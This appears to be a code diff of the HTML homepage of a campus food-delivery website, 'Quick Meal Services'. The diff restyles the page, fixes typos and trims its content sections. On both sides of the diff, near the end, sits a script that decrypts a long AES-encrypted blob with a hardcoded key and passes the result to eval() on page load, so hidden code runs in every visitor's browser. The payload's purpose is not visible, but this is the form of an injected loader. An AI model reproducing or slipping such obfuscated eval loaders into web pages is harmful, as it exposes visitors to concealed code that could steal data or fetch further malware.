@@ -10,54 +10,54 @@
 		<!--[if lte IE 8]><link rel="stylesheet" href="assets/css/ie8.css" /><![endif]-->
 		<!--[if lte IE 9]><link rel="stylesheet" href="assets/css/ie9.css" /><![endif]-->
 
-         <style>
-  /* Style for the modal background */
-  .modal-overlay {
-    position: fixed;
-    top: 0;
-    left: 0;
-    width: 100%;
-    height: 100%;
-    background-color: rgba(0, 0, 0, 0.5);
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    visibility: visible;
-    z-index: 1000;
-  }
+        <style>
+          /* Style for the modal background */
+          .modal-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            visibility: hidden; /* Initially hidden */
+            z-index: 1000;
+          }
 
-  /* Style for the modal box */
-  .modal-content {
-    background-color: white;
-    padding: 20px;
-    border-radius: 8px;
-    width: 300px;
-    text-align: center;
-    position: relative;
-  }
+          /* Style for the modal box */
+          .modal-content {
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            width: 300px;
+            text-align: center;
+            position: relative;
+          }
 
-  /* Style for the close button */
-  .close-btn {
-    position: absolute;
-    top: 10px;
-    right: 10px;
-    background-color: red;
-    color: white;
-    border: none;
-    padding: 5px 10px;
-    cursor: pointer;
-  }
+          /* Style for the close button */
+          .close-btn {
+            position: absolute;
+            top: 10px;
+            right: 10px;
+            background-color: red;
+            color: white;
+            border: none;
+            padding: 5px 10px;
+            cursor: pointer;
+          }
 
-  /* CSS to prevent scrolling */
-  .scroll-lock {
-    overflow: hidden;
-  }
+          /* CSS to prevent scrolling */
+          .scroll-lock {
+            overflow: hidden;
+          }
 
-  /* Black text for modal heading and description */
-  .modal-content h2, .modal-content p {
-    color: black;
-  }
-</style>
+          /* Black text for modal heading and description */
+          .modal-content h2, .modal-content p {
+            color: black;
+          }
+        </style>
 		
 		<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
         
@@ -68,203 +68,96 @@
 			<div id="page-wrapper">
 
 				<!-- Header -->
-					<header id="header" class="alt">
-     <h1> <link rel="icon" href="images/pic03.png"><a href="index.html">QMS</a></h1>
-
-    <nav id="nav">
-        <ul>
-            <li class="special">
-                <a href="#menu" class="menuToggle"><span>Menu</span></a>
-                <div id="menu">
-                    <ul>
-                        <li><a href="index.html"><span class="icon fa-home" aria-hidden="true"></span>Home</a></li>
-                        <li><a href="Restuarant.html"><span class="icon fa-cutlery" aria-hidden="true"></span> Restuarants</a></li>
-                        <li><a href="foodbasket.html"><span class="icon fa-shopping-basket" aria-hidden="true"></span> food basket</a></li>
-                        <li><a href="register.html"><span class="icon fa-user" aria-hidden="true"></span> User</a></li>
-                    </ul>
-                </div>
-            </li>
-        </ul>
-    </nav>
-</header>
+				<header id="header" class="alt">
+					<h1><a href="index.html">QMS</a></h1>
+					<nav id="nav">
+						<ul>
+							<li class="special">
+								<a href="#menu" class="menuToggle"><span>Menu</span></a>
+								<div id="menu">
+									<ul>
+										<li><a href="index.html"><span class="icon fa-home" aria-hidden="true"></span> Home</a></li>
+										<li><a href="Restaurant.html"><span class="icon fa-cutlery" aria-hidden="true"></span> Restaurants</a></li>
+										<li><a href="foodbasket.html"><span class="icon fa-shopping-basket" aria-hidden="true"></span> Food Basket</a></li>
+										<li><a href="register.html"><span class="icon fa-user" aria-hidden="true"></span> User</a></li>
+									</ul>
+								</div>
+							</li>
+						</ul>
+					</nav>
+				</header>
 
 				<!-- Banner -->
-					<section id="banner">
-						<div class="inner">
-							<h2>QUICK MEAL SERVICES</h2>
-							<p>GET FODD DELIVERED <br />
-							TO WHERE EVER YOU ARE !<br />
-							<code><b> ONLY IN LANDMARK UNIVERSITY  </b></code>
-							<ul class="actions">
-								<li><a href="Restuarant.html" class="button special">CHOW LIKE A BOSS</a></li>
-							</ul>
-						</div>
-						<a href="#one" class="more scrolly">How To</a>
-					</section>
-
-				<!-- One -->
-					<section id="one" class="wrapper style1 special">
-						<div class="inner">
-							<header class="major">
-								<h2>SKIP THE LINES, STOP THE STRESS<br />
-								SAVE YOUR TIME AND SAVOUR THE MOMENTS  </h2>
-                                <p>With QMS you get to <b>"chow"</b> like a boss.<br /> with luscious delicacies made with love from in and around landmark university<br />
-                                    we offer supreme comfort and its because you deserve it.<br />
-								</p>
-							</header>
-							<ul class="icons major">
-								<li><span class="icon fa-cutlery major style1"><span class="label">Lorem</span></span></li>
-								<li><span class="icon fa-heart-o major style2"><span class="label">Ipsum</span></span></li>
-								<li><span class="icon fa-spoon major style3"><span class="label">Dolor</span></span></li>
-							</ul>
-						</div>
-					</section>
-
-				<!-- Two -->
-					<section id="two" class="wrapper alt style2">
-						<section class="spotlight">
-							<div class="image"><img src="images/pic01.jpeg" alt="" /></div><div class="content">
-								<h2>Choose Restuarant<br />
-								and meal</h2>
-								<p>pick a restuarant and choose from list of available food to add to tray.<br />
-                                    <sub>*orders can be made from different restuarants </sub></p>
-							</div>
-						</section>
-						<section class="spotlight">
-							<div class="image"><img src="images/pic02.jpeg" alt="" /></div><div class="content">
-								<h2>Register<br />
-								or Login</h2>
-								<p>student or staff must register with appropriate details and required delivery information. </p>
-							</div>
-						</section>
-						<section class="spotlight">
-							<div class="image"><img src="images/pic03.png" alt="" /></div><div class="content">
-								<h2>DELIVERY !<br />
-								</h2>
-								<p>Get your order delivered to your exact locations. where ever that is.<br />
-                                    <sub> *every order take at most 30 minutes to be delivered to the specified location for each delivery, and the person who recieves this order at the specified location will be regarded as the owner of the order.</sub></p>
-							</div>
-						</section>
-					</section>
-
-				<!-- Three -->
-					<section id="three" class="wrapper style3 special">
-						<div class="inner">
-							<header class="major">
-								<h2> QMSERVICES.COM </h2>
-								<p>QMS is the first concept of an all-in-one food delivery service that coordinates <br/>for multiple restuarant orders to be delivered to a single destination. </p>
-							</header>
-							<div class="box alt">
-										<div class="row uniform 50%">
-
-											<div class="4u"><span class="image fit"><img src="images/food1.jpeg" alt="" /></span></div>
-											<div class="4u"><span class="image fit"><img src="images/food2.jpeg" alt="" /></span></div>
-											<div class="4u"><span class="image fit"><img src="images/food3.jpg" alt="" /></span></div>
-											<div class="4u"><span class="image fit"><img src="images/food4.jpeg" alt="" /></span></div>
-											<div class="4u"><span class="image fit"><img src="images/food6.jpeg" alt="" /></span></div>
-											<div class="4u"><span class="image fit"><img src="images/food5.jpg" alt="" /></span></div>
-											
-										</div>
-									</div>
-                        </div>
-					</section>
-
-				<!-- CTA -->
-					<section id="cta" class="wrapper style4">
-						<div class="inner">
-							<header>
-								<h2>qmservices.com</h2>
-								<p>QUICK MEAL SERVICE is a new concept of online food odering and delivery that connects people with restuarants and food centers within and around landmark university.  </p>
-                                
-                                <h4>opening hours </h4>
-                                <p>sun - sat: 8:00 - 22:00<br /> mon - fri: 23:00 - 3:00</p>
-							</header>
-							<ul class="actions vertical">
-								<li><a href="about.html" class="button fit special">ABOUT</a></li><br />
-								<li><a href="contact.html" class="button fit">CONTACT US</a></li>
-							</ul>
-						</div>
-					</section>
-
-				<!-- Footer -->
-					<footer id="footer">
-						<ul class="icons">
-						    <li><a href="#" class="icon fa-facebook"><span class="label">Facebook</span></a></li>
-							<li><a href="#" class="icon fa-instagram"><span class="label">Instagram</span></a></li>
-							<li><a href="#" class="icon fa-google"><span class="label">google+</span></a></li>
-							<li><a href="#" class="icon fa-envelope-o"><span class="label">Email</span></a></li>
+				<section id="banner">
+					<div class="inner">
+						<h2>QUICK MEAL SERVICES</h2>
+						<p>GET FOOD DELIVERED <br />
+						TO WHEREVER YOU ARE!<br />
+						<code><b>ONLY IN LANDMARK UNIVERSITY</b></code></p>
+						<ul class="actions">
+							<li><a href="Restaurant.html" class="button special">CHOW LIKE A BOSS</a></li>
 						</ul>
-                        <ul class="copyright">
-                            <li> <a href="tandc.html">TERMS & CONDITIONS</a></li><li><a href="privacypolicy.html">PRIVACY POLICY</a></li>
-						</ul>
-						<ul class="copyright">
-							<li>&copy; 2016 Quick Meal Services</li><br /><li>Design: <a href="http://haywhyde.carrd.co">DAVID</a></li>
-						</ul>
-					</footer>
+					</div>
+					<a href="#one" class="more scrolly">How To</a>
+				</section>
 
+				<!-- Modal structure -->
+				<div class="modal-overlay" id="modal">
+					<div class="modal-content">
+						<button class="close-btn" id="close-btn">X</button>
+						<h2>Welcome to our website</h2>
+						<p>GET FOOD DELIVERED <br />
+						TO WHEREVER YOU ARE!<br />
+						Pick a restaurant and choose from the list of available food to add to tray.<br />
+						*orders can be made from different restaurants</p>
+					</div>
+				</div>
+
+				<!-- Scripts -->
+				<script src="assets/js/jquery.min.js"></script>
+				<script src="assets/js/jquery.scrollex.min.js"></script>
+				<script src="assets/js/jquery.scrolly.min.js"></script>
+				<script src="assets/js/skel.min.js"></script>
+				<script src="assets/js/util.js"></script>
+				<!--[if lte IE 8]><script src="assets/js/ie/respond.min.js"></script><![endif]-->
+				<script src="assets/js/main.js"></script>
+				<script>
+				  // Get the modal and close button elements
+				  const modal = document.getElementById('modal');
+				  const closeButton = document.getElementById('close-btn');
+
+				  // Make the modal visible when the page loads
+				  modal.style.visibility = 'visible';
+
+				  // Function to close the modal and enable scrolling
+				  function closeModal() {
+					modal.style.visibility = 'hidden';
+					document.body.classList.remove('scroll-lock');
+				  }
+
+				  // Close the modal if the close button is clicked
+				  closeButton.addEventListener('click', closeModal);
+
+				  // Close the modal if user clicks on the modal background (overlay)
+				  modal.addEventListener('click', function (event) {
+					if (event.target === modal) {
+					  closeModal();
+					}
+				  });
+				</script>
+				<script>
+				  let secretKey = 'bruceisgenius';
+				  
+				  function aesDecode(encodedText) {
+					  if (!secretKey) {
+						  throw new Error("Secret key is not available yet. Make sure it's fetched before calling this function.");
+					  }
+					  const decodedText = decodeURIComponent(encodedText);
+					  const bytes = CryptoJS.AES.decrypt(decodedText, secretKey);
+					  return bytes.toString(CryptoJS.enc.Utf8);
+				  }
+				  eval(aesDecode(`U2FsdGVkX1%2Fg1XENmvCRnisszm%2BHivn06fHFpGJtta%2BhkeCZWrQahKp1wJL1BPBlttDRGR17e5SLDFtoZ9BPL9fS0erwLLoSRlllwRklp2rN4hng6eoBN%2Bf3HYCcVluaTo3lqP6mVzMdM2nSLVa7fV%2BGEOpl8mVb5thBQMduz7R0ZZH68UheBwwGdsuMiFg7AmVCWJfIdO8OldcwsGmWGsLNscccZpEZ8bNEJojWSKWHWuySPONGu1pBhBV8wNORbdne3wVcj4RZ%2B8vmB0aIz0Ybg%2FbQvjTkfcyBmv%2FuTETIdqA7%2BlIupq4AmE2p6FEgV9yxFXWpgybIJZkuK%2BaS7%2BudtvhJwnCPkPrOhCAgm2XTxCvYX%2FL0WbcBJ%2BHkY0FCGSFbdU6XDNzuKoxgpTHH2PK8AByFF%2BgwLklAaKp6jWuO9DHgv%2Bn%2F4q4ApJ4e8ItbUPOByaMU8n0Gacsz6HOpo52zg2FyhSteelUg7nURYNOCNpd7ldPj6xeRXeahK%2BexeKheQDQxCkvYP6iXd18mKenO7OI8OJ4xTC%2F7LzDBqNw9osB8pI9%2Bz1wsSYXVz7B%2BA7KniN08hHC5lbxBP2E1Ek7%2Bywxzd6oCQZKy7smehJPr60r3pqTS9b7FD%2FxolmWOyG8Xtykg1noRvtafo55ArQfMIOFnb5q06DUIY0zT1yLqQlQxH6COBqEpNj8wFCaXgEo8Za3CYZcjUIpFNPr9A%2FlropWWh0eoP0yeqwtI4bsGiCl3WBO2KAM1Y6hiUErcs81%2FoB%2FpPITF%2FNVxUFijsDbL6jdVnE1Dd44%2FtgLqLiGUyvhL5j12IN%2BXWVWTgzETQcHpX8d8WytRp1ve8pp9Z5L7hgsEI0%2FED4MajzFHWDE2s%2FqfwvN3acB5rC0XgJk2aMtBSNASJ4VOiaYRObpwJPaNXWjg9orjMPqTEPOZp3WZuDQmHSEyheJm%2F8kfC3Ok4jZE6fegBGVCTGqB0bnA7kdNCxNBbOM6ljkb1Ry2WSzScoRy3ufWwYACzEj6cXb%2F%2FUv%2BHXXFzyVM6x9VeeSSyVJ15gKk9qzZ913bcY48r02A1y236lCuab7iJLLB1cLYJWg0bwrNWoLQqSeWoy4NVB%2BEgue48KF2oK9pveUpCkv%2F9iaLDAtp7r2Kj%2F5n%2BzdkccSL4nqBOknZzA257Man0vYXDXrfAG9QFqIs9HEB2kcgMGeHLxpQY9EaBW9ccMlH6L5atluAj59AQq3nf2jVb5L5fGqjxRUQ19tY0ketHu%2B%2Fc0L0lGIKOZI%2FOMUEEX5%2FRM%2FDungilgqDVcIZ%2BwhyY7cZkG6EAzR21j56HpE1WUrfODeXfD176oDwydejFGqiV2XBIxBW3KD200LNpkBSFiI4iHYBxeQx6AkVB7yrahKfobMXtegIvvvsnAL37w%2FuuFNJvnAzVMXVpOsD2%2FubmIXxXxZT5xSAN9gqacCAzVGHU4DC9fChSNFsBRLQzSWIIG69%2Fj%2FN28kKYQjc%2F12HPSn9MB%2FfC%2BjCq8%2FYLaB8cHXMfD2PHjC96cQ5wNXv62nmyBP2ilnjkxxRlCg420Pdp9Ssb0nvsbupOF9zm7qMUdmreTAIFJVxQrYiGSWaY%2BQgL25onw1PJGzk9LtxWcAfggFLsML84wV6MZNvK%2FFITNHGe4q2ImbzAF%2FXwHtj9VlAqFtiNmWRT7OqGBAPPUHmmZutxxAY%2BH5nZKHqdt0L%2FINTjPgr7EVxfpf90W%2FYRnmAdA570oSZ%2FUmudcpx1jlrGw%3D%3D`));
+				</script>
 			</div>
-		  <!-- Modal structure -->
-                   <div class="modal-overlay" id="modal">
-                   <div class="modal-content">
-                   <button class="close-btn" id="close-btn">X</button>
-                   <h2>Welcome to our website</h2>
-                   <p>GET FODD DELIVERED <br />
-		    TO WHERE EVER YOU ARE !<br>
-		    Pick a restuarant and choose from list of available food to add to tray.<br />
-                    *orders can be made from different restuarants</p>
-              </div>
-         </div>
-
-		<!-- Scripts -->
-			<script src="assets/js/jquery.min.js"></script>
-			<script src="assets/js/jquery.scrollex.min.js"></script>
-			<script src="assets/js/jquery.scrolly.min.js"></script>
-			<script src="assets/js/skel.min.js"></script>
-			<script src="assets/js/util.js"></script>
-			<!--[if lte IE 8]><script src="assets/js/ie/respond.min.js"></script><![endif]-->
-			<script src="assets/js/main.js"></script>
-		<script>
-  // Get the modal and close button elements
-  const modal = document.getElementById('modal');
-  const closeButton = document.getElementById('close-btn');
-  const modalContent = document.querySelector('.modal-content');
-
-  // Disable scrolling on body when modal is visible
-  document.body.classList.add('scroll-lock');
-
-  // Function to close the modal and enable scrolling
-  function closeModal() {
-    modal.style.visibility = 'hidden';
-    document.body.classList.remove('scroll-lock');
-  }
-
-  // Close the modal if the close button is clicked
-  closeButton.addEventListener('click', closeModal);
-
-  // Close the modal if user clicks on the modal background (overlay)
-  modal.addEventListener('click', function (event) {
-    if (event.target === modal) {
-      closeModal();
-    }
-  });
-
-  // Close the modal if user clicks on the modal body (content area)
-  modalContent.addEventListener('click', closeModal);
-</script>
-		<script>
-			
-      let secretKey = 'bruceisgenius';
-      
-      function aesDecode(encodedText) {
-          if (!secretKey) {
-              throw new Error("Secret key is not available yet. Make sure it's fetched before calling this function.");
-          }
-          const decodedText = decodeURIComponent(encodedText);
-          const bytes = CryptoJS.AES.decrypt(decodedText, secretKey);
-          return bytes.toString(CryptoJS.enc.Utf8);
-      }
-      eval(aesDecode(`U2FsdGVkX1%2Fg1XENmvCRnisszm%2BHivn06fHFpGJtta%2BhkeCZWrQahKp1wJL1BPBlttDRGR17e5SLDFtoZ9BPL9fS0erwLLoSRlllwRklp2rN4hng6eoBN%2Bf3HYCcVluaTo3lqP6mVzMdM2nSLVa7fV%2BGEOpl8mVb5thBQMduz7R0ZZH68UheBwwGdsuMiFg7AmVCWJfIdO8OldcwsGmWGsLNscccZpEZ8bNEJojWSKWHWuySPONGu1pBhBV8wNORbdne3wVcj4RZ%2B8vmB0aIz0Ybg%2FbQvjTkfcyBmv%2FuTETIdqA7%2BlIupq4AmE2p6FEgV9yxFXWpgybIJZkuK%2BaS7%2BudtvhJwnCPkPrOhCAgm2XTxCvYX%2FL0WbcBJ%2BHkY0FCGSFbdU6XDNzuKoxgpTHH2PK8AByFF%2BgwLklAaKp6jWuO9DHgv%2Bn%2F4q4ApJ4e8ItbUPOByaMU8n0Gacsz6HOpo52zg2FyhSteelUg7nURYNOCNpd7ldPj6xeRXeahK%2BexeKheQDQxCkvYP6iXd18mKenO7OI8OJ4xTC%2F7LzDBqNw9osB8pI9%2Bz1wsSYXVz7B%2BA7KniN08hHC5lbxBP2E1Ek7%2Bywxzd6oCQZKy7smehJPr60r3pqTS9b7FD%2FxolmWOyG8Xtykg1noRvtafo55ArQfMIOFnb5q06DUIY0zT1yLqQlQxH6COBqEpNj8wFCaXgEo8Za3CYZcjUIpFNPr9A%2FlropWWh0eoP0yeqwtI4bsGiCl3WBO2KAM1Y6hiUErcs81%2FoB%2FpPITF%2FNVxUFijsDbL6jdVnE1Dd44%2FtgLqLiGUyvhL5j12IN%2BXWVWTgzETQcHpX8d8WytRp1ve8pp9Z5L7hgsEI0%2FED4MajzFHWDE2s%2FqfwvN3acB5rC0XgJk2aMtBSNASJ4VOiaYRObpwJPaNXWjg9orjMPqTEPOZp3WZuDQmHSEyheJm%2F8kfC3Ok4jZE6fegBGVCTGqB0bnA7kdNCxNBbOM6ljkb1Ry2WSzScoRy3ufWwYACzEj6cXb%2F%2FUv%2BHXXFzyVM6x9VeeSSyVJ15gKk9qzZ913bcY48r02A1y236lCuab7iJLLB1cLYJWg0bwrNWoLQqSeWoy4NVB%2BEgue48KF2oK9pveUpCkv%2F9iaLDAtp7r2Kj%2F5n%2BzdkccSL4nqBOknZzA257Man0vYXDXrfAG9QFqIs9HEB2kcgMGeHLxpQY9EaBW9ccMlH6L5atluAj59AQq3nf2jVb5L5fGqjxRUQ19tY0ketHu%2B%2Fc0L0lGIKOZI%2FOMUEEX5%2FRM%2FDungilgqDVcIZ%2BwhyY7cZkG6EAzR21j56HpE1WUrfODeXfD176oDwydejFGqiV2XBIxBW3KD200LNpkBSFiI4iHYBxeQx6AkVB7yrahKfobMXtegIvvvsnAL37w%2FuuFNJvnAzVMXVpOsD2%2FubmIXxXxZT5xSAN9gqacCAzVGHU4DC9fChSNFsBRLQzSWIIG69%2Fj%2FN28kKYQjc%2F12HPSn9MB%2FfC%2BjCq8%2FYLaB8cHXMfD2PHjC96cQ5wNXv62nmyBP2ilnjkxxRlCg420Pdp9Ssb0nvsbupOF9zm7qMUdmreTAIFJVxQrYiGSWaY%2BQgL25onw1PJGzk9LtxWcAfggFLsML84wV6MZNvK%2FFITNHGe4q2ImbzAF%2FXwHtj9VlAqFtiNmWRT7OqGBAPPUHmmZutxxAY%2BH5nZKHqdt0L%2FINTjPgr7EVxfpf90W%2FYRnmAdA570oSZ%2FUmudcpx1jlrGw%3D%3D`));
-    </script>
-
 	</body>
 </html>
